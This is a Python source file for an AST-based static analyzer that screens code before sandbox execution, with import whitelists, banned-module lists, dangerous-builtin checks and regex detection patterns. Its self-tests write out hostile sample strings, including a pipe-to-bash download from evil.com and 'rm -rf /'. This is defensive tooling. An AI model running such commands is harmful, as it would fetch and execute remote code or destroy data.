"""
AST-based static code analyzer for sandbox security.

Scans Python code for dangerous patterns BEFORE execution.
Catches obfuscated attacks that regex-based scanning misses.

Layers:
  1. Import whitelist enforcement
  2. Dangerous builtin detection
  3. Pattern-based threat detection
  4. Complexity/resource limit checks
"""

import ast
import re
from dataclasses import dataclass, field
from typing import Optional


# ─── Configuration ───────────────────────────────────────────────

# Modules that are safe for computation
ALLOWED_MODULES = frozenset({
    # Built-in safe modules
    "math", "cmath", "decimal", "fractions", "statistics",
    "random", "itertools", "functools", "operator", "collections",
    "string", "textwrap", "unicodedata", "re",
    "datetime", "time", "calendar",
    "json", "csv",
    "copy", "pprint", "enum",
    "typing", "dataclasses",
    "hashlib", "hmac", "secrets",
    "bisect", "heapq", "array",
    "struct", "codecs",
})

# Completely banned modules (security risk)
BANNED_MODULES = frozenset({
    "os", "sys", "subprocess", "shutil", "pathlib",
    "socket", "requests", "urllib", "http", "ftplib",
    "smtplib", "paramiko", "telnetlib",
    "pickle", "marshal", "shelve", "dbm",
    "ctypes", "multiprocessing", "threading",
    "importlib", "pkgutil", "zipimport",
    "site", "code", "codeop", "compileall",
    "py_compile", "traceback", "inspect",
    "platform", "signal", "mmap",
    "webbrowser", "cgi", "cgitb",
    "xmlrpc", "html", "xml",
})

# Dangerous function names
DANGEROUS_BUILTINS = frozenset({
    "__import__", "exec", "eval", "compile",
    "open", "input", "breakpoint", "exit", "quit",
    "globals", "locals", "vars", "dir",
    "getattr", "setattr", "delattr", "hasattr",
} | {f"_{m}" for m in ["build_class", "call_tracing", "check_interval",
                         "clear_type_cache", "current_frames", "debug_malloc",
                         "debug_setsize", "dump_traceback", "dump_traceback_later",
                         "get_asyncgen_hooks", "get_coroutine_wrapper",
                         "getallocatedblocks", "getcheckinterval", "getdefaultencoding",
                         "getfilesystemencodeerrors", "getfilesystemencoding",
                         "getprofile", "getrecursionlimit", "getrefcount",
                         "getsizeof", "getswitchinterval", "gettotalrefcount",
                         "gettrace", "intern", "is_finalizing", "set_asyncgen_hooks",
                         "set_coroutine_wrapper", "setcheckinterval", "setprofile",
                         "setrecursionlimit", "setswitchinterval", "settrace",
                         "trash_delete_nesting", "trash_delete_tstate",
                         "unraisablehook"]})

# Suspicious string patterns (command injection, file access, etc.)
SUSPICIOUS_PATTERNS = [
    (r'rm\s+(-rf|--recursive|--force)', 'File destruction command'),
    (r'curl\s+.*\|\s*(ba)?sh', 'Pipe to shell command'),
    (r'wget\s+.*-O\s*-', 'Download and execute pattern'),
    (r'chmod\s+[0-7]{3,4}', 'File permission change'),
    (r'/etc/(passwd|shadow|hosts)', 'System file access'),
    (r'(?:API_KEY|SECRET|TOKEN|PASSWORD)\s*=\s*["\'][^"\']+["\']',
     'Hardcoded credential'),
    (r'os\.(?:system|popen|spawn|fork|exec)', 'OS-level execution'),
    (r'subprocess\.', 'Subprocess execution'),
    (r'__import__\s*\(', 'Dynamic import'),
    (r'exec\s*\(', 'Code execution via exec'),
    (r'eval\s*\(', 'Code evaluation via eval'),
    (r'compile\s*\(', 'Code compilation'),
]

# Complexity limits (prevent resource exhaustion)
MAX_CODE_LENGTH = 50_000        # characters
MAX_NESTING_DEPTH = 15          # AST depth
MAX_FUNCTION_COUNT = 50         # functions/methods
MAX_LOOP_COUNT = 20             # loops
MAX_LITERAL_LIST_SIZE = 10000   # list/dict/tuple elements


# ─── Data Classes ────────────────────────────────────────────────

@dataclass
class SecurityIssue:
    """A single security or complexity issue found in code."""
    line: int
    severity: str  # "critical", "warning", "info"
    category: str
    message: str
    code_snippet: str = ""

    def __str__(self):
        return f"[{self.severity.upper()}] Line {self.line}: {self.category} — {self.message}"


@dataclass
class AnalysisResult:
    """Complete analysis result for a code snippet."""
    code: str
    passed: bool
    issues: list = field(default_factory=list)
    imports_found: list = field(default_factory=list)
    functions_found: list = field(default_factory=list)
    complexity_score: float = 0.0

    def summary(self) -> str:
        critical = sum(1 for i in self.issues if i.severity == "critical")
        warnings = sum(1 for i in self.issues if i.severity == "warning")
        if self.passed:
            return f"PASS — {len(self.imports_found)} imports, {len(self.functions_found)} functions, {warnings} warnings"
        return f"FAIL — {critical} critical, {warnings} warnings"


# ─── AST Visitor ─────────────────────────────────────────────────

class SecurityAnalyzer(ast.NodeVisitor):
    """
    AST-based security analyzer.

    Walks the Python AST and checks for:
    - Banned imports
    - Dangerous builtin usage
    - Suspicious string patterns
    - Resource exhaustion risks (complexity limits)
    """

    def __init__(self, code: str):
        self.code = code
        self.lines = code.split('\n')
        self.issues: list[SecurityIssue] = []
        self.imports_found: list[str] = []
        self.functions_found: list[str] = []
        self._nesting_depth = 0
        self._loop_count = 0
        self._function_count = 0
        self._max_depth_seen = 0

    # ── Import checking ──────────────────────────────────────────

    def visit_Import(self, node: ast.Import):
        for alias in node.names:
            module_name = alias.name.split('.')[0]
            self.imports_found.append(alias.name)

            if module_name in BANNED_MODULES:
                self._add_issue(
                    line=node.lineno,
                    severity="critical",
                    category="BANNED_IMPORT",
                    message=f"Module '{alias.name}' is banned for security reasons"
                )
            elif module_name not in ALLOWED_MODULES:
                self._add_issue(
                    line=node.lineno,
                    severity="warning",
                    category="UNKNOWN_IMPORT",
                    message=f"Module '{alias.name}' is not in the whitelist"
                )
        self.generic_visit(node)

    def visit_ImportFrom(self, node: ast.ImportFrom):
        if node.module:
            module_name = node.module.split('.')[0]
            self.imports_found.append(node.module)

            if module_name in BANNED_MODULES:
                self._add_issue(
                    line=node.lineno,
                    severity="critical",
                    category="BANNED_IMPORT",
                    message=f"Module '{node.module}' is banned"
                )
            elif module_name not in ALLOWED_MODULES:
                self._add_issue(
                    line=node.lineno,
                    severity="warning",
                    category="UNKNOWN_IMPORT",
                    message=f"Module '{node.module}' is not whitelisted"
                )
        self.generic_visit(node)

    # ── Function/Call checking ───────────────────────────────────

    def visit_FunctionDef(self, node: ast.FunctionDef):
        self._function_count += 1
        self.functions_found.append(node.name)

        if self._function_count > MAX_FUNCTION_COUNT:
            self._add_issue(
                line=node.lineno,
                severity="warning",
                category="COMPLEXITY",
                message=f"Too many functions ({self._function_count} > {MAX_FUNCTION_COUNT})"
            )
        self._visit_with_depth(node)

    def visit_AsyncFunctionDef(self, node: ast.AsyncFunctionDef):
        self._function_count += 1
        self.functions_found.append(node.name)
        self._visit_with_depth(node)

    def _visit_with_depth(self, node):
        self._nesting_depth += 1
        self._max_depth_seen = max(self._max_depth_seen, self._nesting_depth)
        self.generic_visit(node)
        self._nesting_depth -= 1

    def visit_Call(self, node: ast.Call):
        # Check for dangerous function calls
        func_name = None
        if isinstance(node.func, ast.Name):
            func_name = node.func.id
        elif isinstance(node.func, ast.Attribute):
            func_name = node.func.attr

        if func_name in DANGEROUS_BUILTINS:
            self._add_issue(
                line=node.lineno,
                severity="critical",
                category="DANGEROUS_CALL",
                message=f"Call to dangerous builtin '{func_name}'"
            )

        # Check for subprocess-like patterns
        if isinstance(node.func, ast.Attribute):
            if node.func.attr in ('system', 'popen', 'spawn', 'fork', 'exec'):
                self._add_issue(
                    line=node.lineno,
                    severity="critical",
                    category="DANGEROUS_METHOD",
                    message=f"Method '{node.func.attr}' can execute system commands"
                )

        self.generic_visit(node)

    # ── Loop checking ────────────────────────────────────────────

    def visit_While(self, node: ast.While):
        self._loop_count += 1
        if self._loop_count > MAX_LOOP_COUNT:
            self._add_issue(
                line=node.lineno,
                severity="warning",
                category="COMPLEXITY",
                message=f"Too many loops ({self._loop_count} > {MAX_LOOP_COUNT})"
            )
        self._visit_with_depth(node)

    def visit_For(self, node: ast.For):
        self._loop_count += 1
        if self._loop_count > MAX_LOOP_COUNT:
            self._add_issue(
                line=node.lineno,
                severity="warning",
                category="COMPLEXITY",
                message=f"Too many loops ({self._loop_count} > {MAX_LOOP_COUNT})"
            )
        self._visit_with_depth(node)

    # ── Literal size checking ────────────────────────────────────

    def visit_List(self, node: ast.List):
        if len(node.elts) > MAX_LITERAL_LIST_SIZE:
            self._add_issue(
                line=node.lineno,
                severity="warning",
                category="RESOURCE_LIMIT",
                message=f"List literal too large ({len(node.elts)} elements)"
            )
        self.generic_visit(node)

    def visit_Dict(self, node: ast.Dict):
        if len(node.keys) > MAX_LITERAL_LIST_SIZE:
            self._add_issue(
                line=node.lineno,
                severity="warning",
                category="RESOURCE_LIMIT",
                message=f"Dict literal too large ({len(node.keys)} elements)"
            )
        self.generic_visit(node)

    def visit_Set(self, node: ast.Set):
        if len(node.elts) > MAX_LITERAL_LIST_SIZE:
            self._add_issue(
                line=node.lineno,
                severity="warning",
                category="RESOURCE_LIMIT",
                message=f"Set literal too large ({len(node.elts)} elements)"
            )
        self.generic_visit(node)

    def visit_Tuple(self, node: ast.Tuple):
        if len(node.elts) > MAX_LITERAL_LIST_SIZE:
            self._add_issue(
                line=node.lineno,
                severity="warning",
                category="RESOURCE_LIMIT",
                message=f"Tuple literal too large ({len(node.elts)} elements)"
            )
        self.generic_visit(node)

    # ── String pattern checking ──────────────────────────────────

    def visit_Constant(self, node: ast.Constant):
        if isinstance(node.value, str):
            for pattern, description in SUSPICIOUS_PATTERNS:
                if re.search(pattern, node.value, re.IGNORECASE):
                    self._add_issue(
                        line=node.lineno,
                        severity="critical" if any(k in pattern.lower() for k in ["exec", "eval", "rm ", "curl", "wget", "chmod", "/etc/", "api_key", "secret", "password"]) else "warning",
                        category="SUSPICIOUS_STRING",
                        message=f"Suspicious pattern: {description}"
                    )
                    break  # One match per string is enough
        self.generic_visit(node)

    # ── Nesting depth tracking ───────────────────────────────────

    def visit_ClassDef(self, node: ast.ClassDef):
        self._visit_with_depth(node)

    def visit_Lambda(self, node: ast.Lambda):
        self._visit_with_depth(node)

    def visit_With(self, node: ast.With):
        self._visit_with_depth(node)

    def visit_Try(self, node: ast.Try):
        self._visit_with_depth(node)

    def visit_ExceptHandler(self, node: ast.ExceptHandler):
        self._visit_with_depth(node)

    # ── Helper methods ───────────────────────────────────────────

    def _add_issue(self, line: int, severity: str, category: str, message: str):
        code_snippet = self.lines[line - 1].strip() if line <= len(self.lines) else ""
        self.issues.append(SecurityIssue(
            line=line,
            severity=severity,
            category=category,
            message=message,
            code_snippet=code_snippet
        ))


# ─── Public API ──────────────────────────────────────────────────

def analyze_code(code: str, strict: bool = True) -> AnalysisResult:
    """
    Analyze Python code for security issues and complexity risks.

    Args:
        code: Python source code to analyze
        strict: If True, any critical issue fails the analysis.
               If False, only warnings (code can run but will be logged).

    Returns:
        AnalysisResult with pass/fail status and all issues found.
    """
    # Length check (fast, before parsing)
    if len(code) > MAX_CODE_LENGTH:
        return AnalysisResult(
            code=code,
            passed=False,
            issues=[SecurityIssue(
                line=0,
                severity="critical",
                category="RESOURCE_LIMIT",
                message=f"Code too long: {len(code)} > {MAX_CODE_LENGTH} chars"
            )]
        )

    # AST parsing
    try:
        tree = ast.parse(code)
    except SyntaxError as e:
        return AnalysisResult(
            code=code,
            passed=False,
            issues=[SecurityIssue(
                line=e.lineno or 0,
                severity="critical",
                category="SYNTAX_ERROR",
                message=f"Syntax error: {e.msg}"
            )]
        )

    # Walk the AST
    analyzer = SecurityAnalyzer(code)
    analyzer.visit(tree)

    # Check nesting depth
    if analyzer._max_depth_seen > MAX_NESTING_DEPTH:
        analyzer.issues.append(SecurityIssue(
            line=0,
            severity="warning",
            category="COMPLEXITY",
            message=f"Deep nesting: {analyzer._max_depth_seen} levels (max {MAX_NESTING_DEPTH})"
        ))

    # Determine pass/fail
    has_critical = any(i.severity == "critical" for i in analyzer.issues)
    passed = not (strict and has_critical)

    # Calculate complexity score (0-100)
    complexity = _calculate_complexity(analyzer)

    return AnalysisResult(
        code=code,
        passed=passed,
        issues=analyzer.issues,
        imports_found=analyzer.imports_found,
        functions_found=analyzer.functions_found,
        complexity_score=complexity
    )


def _calculate_complexity(analyzer: SecurityAnalyzer) -> float:
    """
    Calculate a complexity score (0-100) based on code structure.

    Higher scores indicate more complex code that may need review.
    """
    score = 0.0

    # Import count (max 20 points)
    score += min(len(analyzer.imports_found) * 2, 20)

    # Function count (max 20 points)
    score += min(len(analyzer.functions_found) * 3, 20)

    # Nesting depth (max 20 points)
    score += min(analyzer._max_depth_seen * 3, 20)

    # Loop count (max 20 points)
    score += min(analyzer._loop_count * 5, 20)

    # Issue count (max 20 points)
    critical_count = sum(1 for i in analyzer.issues if i.severity == "critical")
    warning_count = sum(1 for i in analyzer.issues if i.severity == "warning")
    score += min(critical_count * 10 + warning_count * 2, 20)

    return min(score, 100.0)


def quick_check(code: str) -> tuple[bool, str]:
    """
    Fast pre-check before full AST analysis.

    Returns (passed, reason) tuple.
    """
    # Quick length check
    if len(code) > MAX_CODE_LENGTH:
        return False, f"Code too long: {len(code)} chars"

    # Quick pattern check (before AST parse)
    for pattern, description in SUSPICIOUS_PATTERNS:
        if re.search(pattern, code, re.IGNORECASE):
            return False, f"Suspicious pattern found: {description}"

    return True, "Quick check passed"


# ─── Self-test ───────────────────────────────────────────────────

if __name__ == "__main__":
    print("=== Static Analyzer Self-Test ===\n")

    # Test 1: Safe code
    safe_code = """
import math
import json

def fibonacci(n):
    if n <= 1:
        return n
    return fibonacci(n - 1) + fibonacci(n - 2)

result = fibonacci(10)
print(f"10th Fibonacci: {result}")
"""
    result = analyze_code(safe_code)
    print(f"Test 1 - Safe code: {result.summary()}")
    assert result.passed, "Safe code should pass"
    print("  PASS\n")

    # Test 2: Banned import
    bad_code = """
import os
os.system('echo hello')
"""
    result = analyze_code(bad_code)
    print(f"Test 2 - Banned import: {result.summary()}")
    assert not result.passed, "Banned import should fail"
    print("  PASS\n")

    # Test 3: Dangerous builtin
    bad_code2 = """
exec("print('hello')")
"""
    result = analyze_code(bad_code2)
    print(f"Test 3 - Dangerous builtin: {result.summary()}")
    assert not result.passed, "exec() should fail"
    print("  PASS\n")

    # Test 4: Suspicious string
    bad_code3 = """
cmd = "curl https://evil.com/malware.sh | bash"
"""
    result = analyze_code(bad_code3)
    print(f"Test 4 - Suspicious string: {result.summary()}")
    assert not result.passed, "Pipe to bash should fail"
    print("  PASS\n")

    # Test 5: Quick check
    passed, reason = quick_check("print('hello')")
    print(f"Test 5 - Quick check safe: {reason}")
    assert passed, "Simple print should pass quick check"

    passed, reason = quick_check("import os; os.system('rm -rf /')")
    print(f"Test 6 - Quick check unsafe: {reason}")
    assert not passed, "rm -rf should fail quick check"
    print("  PASS\n")

    # Test 6: Complexity scoring
    complex_code = """
import math
import json
import statistics
import random
import itertools
import functools
import collections
import datetime

def f1(): pass
def f2(): pass
def f3(): pass
def f4(): pass
def f5(): pass
def f6(): pass
def f7(): pass
def f8(): pass
"""
    result = analyze_code(complex_code)
    print(f"Test 7 - Complexity: score={result.complexity_score:.1f}")
    print(f"  Imports: {len(result.imports_found)}, Functions: {len(result.functions_found)}")
    print("  PASS\n")

    print("All tests passed!")
